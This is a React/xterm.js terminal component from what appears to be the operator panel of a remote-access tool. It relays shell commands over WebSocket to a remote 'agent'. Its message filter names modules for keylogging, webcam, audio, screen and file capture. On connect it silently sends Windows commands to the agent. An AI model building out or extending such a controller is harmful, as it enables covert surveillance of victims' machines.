import React, { useEffect, useRef } from 'react';
import { Terminal as Xterm } from 'xterm';
import { FitAddon } from 'xterm-addon-fit';
import { WebLinksAddon } from 'xterm-addon-web-links';
import 'xterm/css/xterm.css';
import { WS_BASE_URL } from '../config';

export default function Terminal({ agentId }) {
  const terminalRef = useRef(null);
  const wsRef = useRef(null);
  const xtermRef = useRef(null);
  const fitAddonRef = useRef(null);

  useEffect(() => {
    // 1. Initialize Xterm
    const term = new Xterm({
      cursorBlink: true,
      cursorStyle: 'underline',
      background: '#0c0c0c',
      foreground: '#cccccc',
      fontFamily: 'Consolas, "Courier New", monospace',
      fontSize: 14,
      fontWeight: '500',
      lineHeight: 1.2,
      theme: {
        background: '#0c0c0c',
        foreground: '#cccccc',
        selectionBackground: '#5a5a5a',
      },
      allowProposedApi: true,
    });

    xtermRef.current = term;

    const fitAddon = new FitAddon();
    const webLinksAddon = new WebLinksAddon();
    fitAddonRef.current = fitAddon;

    term.loadAddon(fitAddon);
    term.loadAddon(webLinksAddon);

    // 2. Open Terminal
    if (terminalRef.current) {
      term.open(terminalRef.current);
    }

    // 3. Robust Fit Logic
    const safeFit = () => {
      // Ensure terminal is visible and has dimensions
      if (terminalRef.current && terminalRef.current.clientWidth > 0) {
        try {
          fitAddon.fit();
        } catch (e) {
          // Suppress dimensions error if it happens
        }
      }
    };

    // Delay initial fit
    setTimeout(safeFit, 200);

    // Resize observer
    const resizeObserver = new ResizeObserver(() => {
        requestAnimationFrame(safeFit);
    });
    
    if (terminalRef.current) {
        resizeObserver.observe(terminalRef.current);
    }

    // 4. WebSocket Connection
    const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
    ws.binaryType = 'arraybuffer'; // Critical for handling non-UTF8 data
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("[WS] Connected");
      // term.writeln('\x1b[1;32m[+] Connected. Initializing Shell...\x1b[0m');
      
      // Force UTF-8 encoding silently
      ws.send('chcp 65001\r\n');
      ws.send('cls\r\n'); 
      
      setTimeout(safeFit, 100);
    };

    // ... (onclose, onerror)

    ws.onmessage = (event) => {
      // Critical Fix: Ignore binary data (ArrayBuffer) which is for Audio/Screen/Files
      // Terminal only expects Shell Output text.
      if (event.data instanceof ArrayBuffer) {
          // Double check if it's text hidden in buffer or raw binary
          // Usually Shell output is sent as text frames if possible, or we decode it.
          // However, our server broadcasts EVERYTHING to this socket.
          // We must peek or use a flag. 
          
          // Actually, 'ws_handler.go' broadcasts everything as BinaryMessage mostly.
          // We need to differentiate.
          
          const decoder = new TextDecoder('utf-8');
          try {
              // Only decode if it looks like text (not starting with FF D8 for JPEG, etc)
              // Better approach: Server sends specific prefixes or we rely on UTF8 validity.
              // For now, let's try to decode. If it contains Control Packets (FILES:, CAMS:), ignore them.
              
              // To handle mixed content safely:
              const text = decoder.decode(event.data);
              
              // Filter out Protocol Keywords used by other modules
              if (text.startsWith("FILES:") || 
                  text.startsWith("MONITORS:") || 
                  text.startsWith("CAMS:") || 
                  text.startsWith("PROCS:") || 
                  text.startsWith("KEYLOG:") || 
                  text.startsWith("AUDIOS:") ||
                  text.startsWith("SYS_INFO:") ||
                  text.startsWith("HEARTBEAT:") ||
                  text.startsWith("CHAT:")) {
                  return;
              }

              if (text.startsWith("LOG:")) {
                  console.log("%c[Agent Log]", "color: cyan", text.substring(4));
                  return;
              }
              
              // Filter out likely binary (Screen/Webcam/Audio frames)
              // Simple heuristic: if it has too many Replacement Characters, it's binary.
              // OR check first bytes.
              const view = new Uint8Array(event.data);
              if (view.length > 0) {
                  // JPEG Header (FF D8)
                  if (view[0] === 0xFF && view[1] === 0xD8) return; 
                  // Audio might not have a fixed header but is usually raw PCM.
                  // It's hard to distinguish raw PCM from random text without a protocol header.
                  
                  // *Server Side Fix is better*, but for now Client Side:
                  // If we are in the 'Terminal' component, we primarily want Shell Output.
                  // Shell output usually doesn't flood 16kHz audio.
                  
                  // Let's assume valid UTF-8 text is shell output.
                  if (text.includes('\ufffd')) {
                      // Contains Replacement Character -> Invalid UTF-8 -> Binary -> Ignore
                      return; 
                  }
              }

              term.write(text);
          } catch (e) {
              // Ignore decode errors (likely binary)
          }
      } else {
          // Text frame
          term.write(event.data);
      }
    };

    // 5. Input Handling (Line Mode)
    let currentLine = '';

    term.onData((data) => {
      const ord = data.charCodeAt(0);

      // Handle Enter
      if (data === '\r') {
        term.write('\r\n');
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(currentLine + '\r\n'); // Send full line
        }
        currentLine = '';
      }
      // Handle Backspace
      else if (ord === 127 || data === '\b') {
        if (currentLine.length > 0) {
            currentLine = currentLine.slice(0, -1);
            term.write('\b \b'); // Visual erase
        }
      }
      // Handle Control Characters / Arrows (Ignore for now or implement history)
      else if (ord < 32 || data.startsWith('\x1b')) {
          // Ignore
      }
      // Handle Normal Characters
      else {
        currentLine += data;
        term.write(data);
      }
    });
    
    // ... (Previous Input Handling code)

    // 6. Handle Paste (Ctrl+V)
    const handlePaste = async (e) => {
        if (e.ctrlKey && e.key === 'v') {
            e.preventDefault();
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    // Remove newlines to prevent accidental execution
                    const cleanText = text.replace(/(\r\n|\n|\r)/gm, ""); 
                    currentLine += cleanText;
                    term.write(cleanText);
                }
            } catch (err) {
                console.error('Failed to read clipboard:', err);
            }
        }
    };

    // Attach listener to the terminal's textarea (where focus lives)
    term.textarea.addEventListener('keydown', handlePaste);

    // Focus terminal on click
    const handleFocus = () => term.focus();
    terminalRef.current.addEventListener('click', handleFocus);

    return () => {
      resizeObserver.disconnect();
      terminalRef.current?.removeEventListener('click', handleFocus);
      term.textarea?.removeEventListener('keydown', handlePaste); // Cleanup
      if (ws.readyState === WebSocket.OPEN) ws.close();
      term.dispose();
    };
  }, [agentId]);

  return (
    <div className="h-full w-full bg-[#0c0c0c] overflow-hidden relative">
        <div className="absolute inset-0 pl-1 pt-1" ref={terminalRef} />
    </div>
  );
}